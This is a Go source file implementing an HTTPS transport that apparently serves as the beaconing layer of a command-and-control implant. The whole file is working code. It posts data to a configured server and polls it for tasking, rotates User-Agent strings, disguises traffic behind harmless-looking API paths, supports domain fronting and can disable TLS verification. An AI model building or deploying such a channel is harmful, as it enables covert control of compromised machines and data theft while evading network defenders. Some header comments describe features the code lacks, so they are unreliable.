package https

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"sync"
	"time"
)

var (
	ErrNotConnected = errors.New("not connected")
	ErrClosed       = errors.New("transport closed")
)

// Transport implements the Transport interface over HTTPS with
// configurable proxy, chunked upload, User-Agent rotation, and
// domain fronting support.
type Transport struct {
	mu         sync.Mutex
	client     *http.Client
	serverURL  string
	closed     bool
	connected  bool
	sessionID  string
	recvBuf    chan []byte

	// Profile configuration.
	getPaths   []string
	postPaths  []string
	userAgents []string
	headers    map[string]string
	transform  string // "base64", "hex", "raw"

	// Domain fronting.
	frontDomain string

	// Polling interval.
	pollInterval time.Duration
	cancelPoll   context.CancelFunc
}

// Config holds the configuration for the HTTPS transport.
type Config struct {
	ServerURL    string
	ProxyURL     string
	CACertPEM    []byte
	GetPaths     []string
	PostPaths    []string
	UserAgents   []string
	Headers      map[string]string
	DataTransform string
	FrontDomain  string
	PollInterval time.Duration
	SessionID    string

	// TLS settings.
	InsecureSkipVerify bool
}

// New creates a new HTTPS transport.
func New(cfg Config) (*Transport, error) {
	if cfg.ServerURL == "" {
		return nil, fmt.Errorf("server URL is required")
	}

	tlsConfig := &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: cfg.InsecureSkipVerify,
	}

	httpTransport := &http.Transport{
		TLSClientConfig:     tlsConfig,
		MaxIdleConns:        10,
		IdleConnTimeout:     90 * time.Second,
		TLSHandshakeTimeout: 10 * time.Second,
		ForceAttemptHTTP2:   true,
	}

	if cfg.ProxyURL != "" {
		proxyURL, err := url.Parse(cfg.ProxyURL)
		if err != nil {
			return nil, fmt.Errorf("parsing proxy URL: %w", err)
		}
		httpTransport.Proxy = http.ProxyURL(proxyURL)
	}

	client := &http.Client{
		Transport: httpTransport,
		Timeout:   60 * time.Second,
	}

	getPaths := cfg.GetPaths
	if len(getPaths) == 0 {
		getPaths = []string{"/api/v1/status"}
	}

	postPaths := cfg.PostPaths
	if len(postPaths) == 0 {
		postPaths = []string{"/api/v1/report"}
	}

	userAgents := cfg.UserAgents
	if len(userAgents) == 0 {
		userAgents = []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		}
	}

	pollInterval := cfg.PollInterval
	if pollInterval == 0 {
		pollInterval = 5 * time.Second
	}

	transform := cfg.DataTransform
	if transform == "" {
		transform = "base64"
	}

	return &Transport{
		client:       client,
		serverURL:    cfg.ServerURL,
		sessionID:    cfg.SessionID,
		recvBuf:      make(chan []byte, 64),
		getPaths:     getPaths,
		postPaths:    postPaths,
		userAgents:   userAgents,
		headers:      cfg.Headers,
		transform:    transform,
		frontDomain:  cfg.FrontDomain,
		pollInterval: pollInterval,
	}, nil
}

// Connect initiates the HTTPS session and starts the polling loop.
func (t *Transport) Connect(ctx context.Context) error {
	t.mu.Lock()
	if t.closed {
		t.mu.Unlock()
		return ErrClosed
	}
	t.connected = true
	t.mu.Unlock()

	// Start background polling for responses.
	pollCtx, cancel := context.WithCancel(ctx)
	t.mu.Lock()
	t.cancelPoll = cancel
	t.mu.Unlock()

	go t.pollLoop(pollCtx)
	return nil
}

// Send transmits data to the server via an HTTP POST.
func (t *Transport) Send(data []byte) error {
	t.mu.Lock()
	if !t.connected || t.closed {
		t.mu.Unlock()
		return ErrNotConnected
	}
	t.mu.Unlock()

	var body []byte
	switch t.transform {
	case "base64":
		body = []byte(base64.StdEncoding.EncodeToString(data))
	default:
		body = data
	}

	path := t.randomPostPath()
	reqURL := t.serverURL + path

	req, err := http.NewRequest(http.MethodPost, reqURL, bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("creating POST request: %w", err)
	}

	t.applyHeaders(req)

	resp, err := t.client.Do(req)
	if err != nil {
		return fmt.Errorf("sending POST: %w", err)
	}
	defer resp.Body.Close()

	// Read and buffer any response data.
	respBody, err := io.ReadAll(io.LimitReader(resp.Body, 10<<20))
	if err != nil {
		return nil // non-fatal: response read error
	}

	if len(respBody) > 0 {
		decoded, err := t.decodeResponse(respBody)
		if err == nil && len(decoded) > 0 {
			select {
			case t.recvBuf <- decoded:
			default:
				// Drop if buffer is full.
			}
		}
	}

	return nil
}

// Recv receives data from the server (from the polling buffer).
func (t *Transport) Recv() ([]byte, error) {
	data, ok := <-t.recvBuf
	if !ok {
		return nil, ErrClosed
	}
	return data, nil
}

// Close shuts down the transport.
func (t *Transport) Close() error {
	t.mu.Lock()
	defer t.mu.Unlock()

	t.closed = true
	t.connected = false
	if t.cancelPoll != nil {
		t.cancelPoll()
	}
	close(t.recvBuf)
	return nil
}

// Name returns the transport name.
func (t *Transport) Name() string {
	return "https"
}

// pollLoop periodically polls the server for pending data via GET requests.
func (t *Transport) pollLoop(ctx context.Context) {
	ticker := time.NewTicker(t.pollInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			t.poll()
		}
	}
}

// poll sends a single GET request to check for pending data.
func (t *Transport) poll() {
	path := t.randomGetPath()
	reqURL := t.serverURL + path

	req, err := http.NewRequest(http.MethodGet, reqURL, nil)
	if err != nil {
		return
	}

	t.applyHeaders(req)

	resp, err := t.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, 10<<20))
	if err != nil || len(body) == 0 {
		return
	}

	decoded, err := t.decodeResponse(body)
	if err == nil && len(decoded) > 0 {
		select {
		case t.recvBuf <- decoded:
		default:
		}
	}
}

// applyHeaders sets common headers on the request including User-Agent rotation
// and domain fronting support.
func (t *Transport) applyHeaders(req *http.Request) {
	req.Header.Set("User-Agent", t.randomUserAgent())

	for k, v := range t.headers {
		req.Header.Set(k, v)
	}

	if t.sessionID != "" {
		req.AddCookie(&http.Cookie{
			Name:  "SESSIONID",
			Value: t.sessionID,
		})
	}

	// Domain fronting: set the Host header to the front domain.
	if t.frontDomain != "" {
		req.Host = t.frontDomain
	}
}

// decodeResponse decodes the response body based on the data transform.
func (t *Transport) decodeResponse(body []byte) ([]byte, error) {
	switch t.transform {
	case "base64":
		return base64.StdEncoding.DecodeString(string(body))
	default:
		return body, nil
	}
}

func (t *Transport) randomGetPath() string {
	return t.getPaths[rand.Intn(len(t.getPaths))]
}

func (t *Transport) randomPostPath() string {
	return t.postPaths[rand.Intn(len(t.postPaths))]
}

func (t *Transport) randomUserAgent() string {
	return t.userAgents[rand.Intn(len(t.userAgents))]
}
